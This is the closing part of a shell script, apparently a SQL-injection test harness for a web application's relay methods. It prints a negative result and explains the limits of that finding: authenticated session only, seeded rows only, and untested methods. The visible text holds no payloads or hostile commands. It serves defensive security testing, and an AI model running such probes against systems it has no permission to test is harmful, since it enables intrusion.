printf '>>> RESULT: NO EXPLOIT OBSERVED (measured negative, exit 0)\n'
printf '    What WAS measured: the supplied session answered Login.LoggedIn() == "true"; all\n'
printf '    %s probe(s) answered with a non-empty body, so every method dispatched (a 0-byte\n' "$G_PROBES"
printf '    body is counted INCONCLUSIVE, never clean); each site reachability call returned\n'
printf '    the rows the query can find and each benign control was asserted against its\n'
printf '    expected answer and matched (a reachability or control assertion that did NOT\n'
printf '    hold is counted as WEAKER THAN MEASURED and would have made this exit 2, with the\n'
printf '    site listed as not cleared); and each injected call\n'
printf '    returned no digest, no unexpected row and no MySQL error text.\n'
printf '    What was NOT measured: nothing here is evidence about an unauthenticated caller\n'
printf '    (this script always sends the session you supplied), nothing about a deployment\n'
printf '    whose modules/entemplate/payrec rows differ from the seeded rows named above,\n'
printf '    and nothing about the other relay methods in the same files.\n'
exit 0